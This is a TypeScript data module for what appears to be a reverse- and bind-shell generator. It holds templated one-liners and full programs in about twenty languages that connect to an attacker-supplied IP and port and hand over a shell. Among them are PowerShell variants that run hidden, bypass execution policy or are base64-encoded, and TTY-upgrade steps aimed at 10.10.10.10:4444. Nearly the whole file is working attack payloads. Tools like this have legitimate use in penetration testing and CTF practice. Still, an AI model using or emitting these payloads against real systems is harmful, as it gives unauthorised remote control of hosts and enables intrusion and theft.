export type ShellType = "reverse" | "bind";
export type TargetOS = "linux" | "windows" | "all";

export interface ShellVariant {
  name: string;
  command: (ip: string, port: string, shell: string) => string;
}

export interface ShellLanguage {
  id: string;
  name: string;
  os: TargetOS;
  variants: ShellVariant[];
  listener: string;
}

export const TARGET_SHELLS = [
  { value: "/bin/sh", label: "/bin/sh" },
  { value: "/bin/bash", label: "/bin/bash" },
  { value: "/bin/zsh", label: "/bin/zsh" },
  { value: "/bin/ash", label: "/bin/ash" },
  { value: "cmd.exe", label: "cmd.exe" },
  { value: "powershell.exe", label: "powershell.exe" },
] as const;

const reverseShells: ShellLanguage[] = [
  {
    id: "bash",
    name: "Bash",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Bash -i",
        command: (ip, port, shell) =>
          `${shell} -i >& /dev/tcp/${ip}/${port} 0>&1`,
      },
      {
        name: "Bash 196",
        command: (ip, port) =>
          `0<&196;exec 196<>/dev/tcp/${ip}/${port}; bash <&196 >&196 2>&196`,
      },
      {
        name: "Bash UDP",
        command: (ip, port, shell) =>
          `${shell} -i >& /dev/udp/${ip}/${port} 0>&1`,
      },
      {
        name: "Bash read line",
        command: (ip, port) =>
          `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
      },
      {
        name: "Bash 5",
        command: (ip, port, shell) =>
          `${shell} -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
      },
    ],
  },
  {
    id: "python",
    name: "Python",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Python3 shortest",
        command: (ip, port, shell) =>
          `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("${shell}")'`,
      },
      {
        name: "Python3 #1",
        command: (ip, port, shell) =>
          `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`,
      },
      {
        name: "Python3 #2",
        command: (ip, port, shell) =>
          `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("${shell}")'`,
      },
      {
        name: "Python3 Windows",
        command: (ip, port) =>
          `python3 -c "import socket,subprocess;s=socket.socket();s.connect(('${ip}',${port}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"`,
      },
      {
        name: "Python2",
        command: (ip, port, shell) =>
          `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["${shell}","-i"]);'`,
      },
    ],
  },
  {
    id: "powershell",
    name: "PowerShell",
    os: "windows",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "PowerShell #1",
        command: (ip, port) =>
          `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      },
      {
        name: "PowerShell #2",
        command: (ip, port) =>
          `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,
      },
      {
        name: "PowerShell Base64",
        command: (ip, port) => {
          const payload = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
          const b64 = typeof btoa !== "undefined" ? btoa(payload) : Buffer.from(payload).toString("base64");
          return `powershell -e ${b64}`;
        },
      },
      {
        name: "PowerShell TLS",
        command: (ip, port) =>
          `powershell -nop -c "$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object System.Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare.com',$null,'Tls12',$false);$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,
      },
    ],
  },
  {
    id: "php",
    name: "PHP",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "PHP exec",
        command: (ip, port, shell) =>
          `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} <&3 >&3 2>&3");'`,
      },
      {
        name: "PHP shell_exec",
        command: (ip, port, shell) =>
          `php -r '$sock=fsockopen("${ip}",${port});shell_exec("${shell} <&3 >&3 2>&3");'`,
      },
      {
        name: "PHP popen",
        command: (ip, port, shell) =>
          `php -r '$sock=fsockopen("${ip}",${port});popen("${shell} <&3 >&3 2>&3", "r");'`,
      },
      {
        name: "PHP proc_open",
        command: (ip, port, shell) =>
          `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("${shell}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,
      },
    ],
  },
  {
    id: "ruby",
    name: "Ruby",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Ruby #1",
        command: (ip, port, shell) =>
          `ruby -rsocket -e'spawn("${shell}",[:in,:out,:err]=>TCPSocket.new("${ip}",${port}))'`,
      },
      {
        name: "Ruby #2",
        command: (ip, port) =>
          `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444/444444cd (.+)/444444/444444/444444)?Dir.chdir($1):IO.popen($_,?r){|io|c.print io.read}}'`.replaceAll("444444",""),
      },
    ],
  },
  {
    id: "perl",
    name: "Perl",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Perl",
        command: (ip, port, shell) =>
          `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`,
      },
      {
        name: "Perl no sh",
        command: (ip, port) =>
          `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
      },
    ],
  },
  {
    id: "netcat",
    name: "Netcat",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "nc -e",
        command: (ip, port, shell) =>
          `nc ${ip} ${port} -e ${shell}`,
      },
      {
        name: "nc -c",
        command: (ip, port, shell) =>
          `nc -c ${shell} ${ip} ${port}`,
      },
      {
        name: "nc mkfifo",
        command: (ip, port, shell) =>
          `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      },
      {
        name: "ncat",
        command: (ip, port, shell) =>
          `ncat ${ip} ${port} -e ${shell}`,
      },
      {
        name: "ncat UDP",
        command: (ip, port, shell) =>
          `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|ncat -u ${ip} ${port} >/tmp/f`,
      },
      {
        name: "nc.exe (Windows)",
        command: (ip, port) =>
          `nc.exe ${ip} ${port} -e cmd.exe`,
      },
    ],
  },
  {
    id: "socat",
    name: "Socat",
    os: "linux",
    listener: "socat file:`tty`,raw,echo=0 TCP-L:{port}",
    variants: [
      {
        name: "Socat #1",
        command: (ip, port, shell) =>
          `socat TCP:${ip}:${port} EXEC:'${shell}',pty,stderr,setsid,sigint,sane`,
      },
      {
        name: "Socat #2 (TTY)",
        command: (ip, port, shell) =>
          `socat TCP:${ip}:${port} EXEC:${shell},pty,stderr,setsid,sigint,sane`,
      },
    ],
  },
  {
    id: "java",
    name: "Java",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Java Runtime",
        command: (ip, port, shell) =>
          `Runtime r = Runtime.getRuntime();\nProcess p = r.exec("${shell} -c 'exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done'");\np.waitFor();`,
      },
      {
        name: "Java #1",
        command: (ip, port, shell) =>
          `String host="${ip}";\nint port=${port};\nString cmd="${shell}";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
      },
    ],
  },
  {
    id: "groovy",
    name: "Groovy",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Groovy",
        command: (ip, port, shell) =>
          `String host="${ip}";\nint port=${port};\nString cmd="${shell}";\nProcess p=cmd.execute();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`,
      },
    ],
  },
  {
    id: "lua",
    name: "Lua",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Lua #1",
        command: (ip, port, shell) =>
          `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('${shell} -i <&3 >&3 2>&3');"`,
      },
      {
        name: "Lua #2",
        command: (ip, port) =>
          `lua5.1 -e 'local host, port = "${ip}", ${port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
      },
    ],
  },
  {
    id: "nodejs",
    name: "Node.js",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Node.js #1",
        command: (ip, port, shell) =>
          `require('child_process').exec('${shell} -i >& /dev/tcp/${ip}/${port} 0>&1')`,
      },
      {
        name: "Node.js #2",
        command: (ip, port, shell) =>
          `(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("${shell}", []);var client = new net.Socket();client.connect(${port}, "${ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
      },
    ],
  },
  // --- NEW LANGUAGES ---
  {
    id: "c",
    name: "C",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "C reverse shell",
        command: (ip, port, shell) =>
          `#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = ${port};\n    struct sockaddr_in revsockaddr;\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr("${ip}");\n    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n    char * const argv[] = {"${shell}", NULL};\n    execve("${shell}", argv, NULL);\n    return 0;\n}`,
      },
      {
        name: "C one-liner (gcc)",
        command: (ip, port, shell) =>
          `echo '#include <stdio.h>\\n#include <sys/socket.h>\\n#include <sys/types.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\nint main(void){int port=${port};struct sockaddr_in sa;int s=socket(AF_INET,SOCK_STREAM,0);sa.sin_family=AF_INET;sa.sin_port=htons(port);sa.sin_addr.s_addr=inet_addr("${ip}");connect(s,(struct sockaddr*)&sa,sizeof(sa));dup2(s,0);dup2(s,1);dup2(s,2);char*const a[]={"${shell}",NULL};execve("${shell}",a,NULL);}' > /tmp/rs.c && gcc /tmp/rs.c -o /tmp/rs && /tmp/rs`,
      },
    ],
  },
  {
    id: "csharp",
    name: "C#",
    os: "windows",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "C# TCP Client",
        command: (ip, port) =>
          `using System;using System.Net.Sockets;using System.Diagnostics;using System.IO;\n\nclass Rev {\n  static void Main() {\n    using(TcpClient client = new TcpClient("${ip}", ${port})) {\n      using(Stream stream = client.GetStream()) {\n        using(StreamReader rdr = new StreamReader(stream)) {\n          StreamWriter wtr = new StreamWriter(stream);\n          StringBuilder strInput = new StringBuilder();\n          Process p = new Process();\n          p.StartInfo.FileName = "cmd.exe";\n          p.StartInfo.CreateNoWindow = true;\n          p.StartInfo.UseShellExecute = false;\n          p.StartInfo.RedirectStandardOutput = true;\n          p.StartInfo.RedirectStandardInput = true;\n          p.StartInfo.RedirectStandardError = true;\n          p.OutputDataReceived += new DataReceivedEventHandler((sender, e) => { wtr.WriteLine(e.Data); wtr.Flush(); });\n          p.ErrorDataReceived += new DataReceivedEventHandler((sender, e) => { wtr.WriteLine(e.Data); wtr.Flush(); });\n          p.Start();\n          p.BeginOutputReadLine();\n          p.BeginErrorReadLine();\n          while(true) {\n            strInput.Append(rdr.ReadLine());\n            p.StandardInput.WriteLine(strInput);\n            strInput.Remove(0, strInput.Length);\n          }\n        }\n      }\n    }\n  }\n}`,
      },
      {
        name: "C# PowerShell one-liner",
        command: (ip, port) =>
          `powershell -nop -c "$code = 'using System;using System.Net.Sockets;using System.IO;using System.Diagnostics;class S{static void Main(){using(var c=new TcpClient(\\"${ip}\\",${port})){using(var s=c.GetStream()){byte[] b=new byte[1024];int i;var p=new Process();p.StartInfo.FileName=\\"cmd.exe\\";p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.Start();var sw=new StreamWriter(s);var t1=Task.Run(()=>{string l;while((l=p.StandardOutput.ReadLine())!=null){sw.WriteLine(l);sw.Flush();}});var t2=Task.Run(()=>{string l;while((l=p.StandardError.ReadLine())!=null){sw.WriteLine(l);sw.Flush();}});var sr=new StreamReader(s);string cmd;while((cmd=sr.ReadLine())!=null){p.StandardInput.WriteLine(cmd);}}}}}';"`,
      },
    ],
  },
  {
    id: "golang",
    name: "Golang",
    os: "all",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Go reverse shell",
        command: (ip, port, shell) =>
          `package main\n\nimport (\n    "net"\n    "os/exec"\n    "syscall"\n)\n\nfunc main() {\n    c, _ := net.Dial("tcp", "${ip}:${port}")\n    cmd := exec.Command("${shell}")\n    cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}\n    cmd.Stdin = c\n    cmd.Stdout = c\n    cmd.Stderr = c\n    cmd.Run()\n}`,
      },
      {
        name: "Go one-liner (compile & run)",
        command: (ip, port, shell) =>
          `echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("${shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go`,
      },
    ],
  },
  {
    id: "awk",
    name: "Awk",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Awk",
        // eslint-disable-next-line @typescript-eslint/no-unused-vars
        command: (ip, port, _shell) =>
          `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
      },
      {
        name: "Awk + bash",
        // eslint-disable-next-line @typescript-eslint/no-unused-vars
        command: (ip, port, _shell) =>
          `awk -v RHOST=${ip} -v RPORT=${port} 'BEGIN {s="/inet/tcp/0/"RHOST"/"RPORT; while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'`,
      },
    ],
  },
  {
    id: "telnet",
    name: "Telnet",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Telnet",
        command: (ip, port, shell) =>
          `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | ${shell} 1>$TF`,
      },
      {
        name: "Telnet two-port",
        command: (ip, port, shell) =>
          `telnet ${ip} ${port} | ${shell} | telnet ${ip} ${parseInt(port) + 1}`,
      },
    ],
  },
  {
    id: "zsh",
    name: "Zsh",
    os: "linux",
    listener: "nc -lvnp {port}",
    variants: [
      {
        name: "Zsh",
        command: (ip, port) =>
          `zsh -c 'zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
      },
      {
        name: "Zsh /dev/tcp",
        command: (ip, port) =>
          `zsh -i >& /dev/tcp/${ip}/${port} 0>&1`,
      },
    ],
  },
];

const bindShells: ShellLanguage[] = [
  {
    id: "bind-netcat",
    name: "Netcat (Bind)",
    os: "linux",
    listener: "nc {ip} {port}",
    variants: [
      {
        name: "nc -e bind",
        command: (_ip, port, shell) =>
          `nc -lvnp ${port} -e ${shell}`,
      },
      {
        name: "nc mkfifo bind",
        command: (_ip, port, shell) =>
          `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc -lvnp ${port} >/tmp/f`,
      },
    ],
  },
  {
    id: "bind-python",
    name: "Python (Bind)",
    os: "all",
    listener: "nc {ip} {port}",
    variants: [
      {
        name: "Python3 bind",
        command: (_ip, port, shell) =>
          `python3 -c 'import socket,os,pty;s=socket.socket();s.bind(("0.0.0.0",${port}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("${shell}")'`,
      },
    ],
  },
  {
    id: "bind-socat",
    name: "Socat (Bind)",
    os: "linux",
    listener: "socat - TCP:{ip}:{port}",
    variants: [
      {
        name: "Socat bind",
        command: (_ip, port, shell) =>
          `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:${shell},pty,stderr,setsid,sigint,sane`,
      },
    ],
  },
  {
    id: "bind-php",
    name: "PHP (Bind)",
    os: "all",
    listener: "nc {ip} {port}",
    variants: [
      {
        name: "PHP bind",
        // eslint-disable-next-line @typescript-eslint/no-unused-vars
        command: (_ip, port, _shell) =>
          `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))die;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){socket_write($cl,fread($cmd,2048),2048);}pclose($cmd);}'`,
      },
    ],
  },
  {
    id: "bind-perl",
    name: "Perl (Bind)",
    os: "all",
    listener: "nc {ip} {port}",
    variants: [
      {
        name: "Perl bind",
        command: (_ip, port, shell) =>
          `perl -e 'use Socket;$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("${shell} -i");};'`,
      },
    ],
  },
];

export function getReverseShells(): ShellLanguage[] {
  return reverseShells;
}

export function getBindShells(): ShellLanguage[] {
  return bindShells;
}

export function getShells(): ShellLanguage[] {
  return reverseShells;
}

export function getShellById(id: string): ShellLanguage | undefined {
  return [...reverseShells, ...bindShells].find((s) => s.id === id);
}

export function encodeBase64(str: string): string {
  if (typeof btoa !== "undefined") {
    return btoa(str);
  }
  return Buffer.from(str).toString("base64");
}

export function encodeUrl(str: string): string {
  return encodeURIComponent(str);
}

export const TTY_UPGRADES = [
  {
    name: "Python PTY spawn",
    command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    name: "Script TTY",
    command: `script -qc /bin/bash /dev/null`,
  },
  {
    name: "Stty raw (run on attacker after spawn)",
    command: `# In reverse shell:\n$ python3 -c 'import pty; pty.spawn("/bin/bash")'\n$ ^Z  (Ctrl+Z to background)\n\n# On attacker:\n$ stty raw -echo; fg\n\n# Back in reverse shell:\n$ reset\n$ export SHELL=bash\n$ export TERM=xterm-256color\n$ stty rows 38 columns 116`,
  },
  {
    name: "Socat TTY (requires socat on target)",
    command: `# Attacker:\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444`,
  },
  {
    name: "rlwrap (attacker-side)",
    command: `rlwrap nc -lvnp 4444`,
  },
];
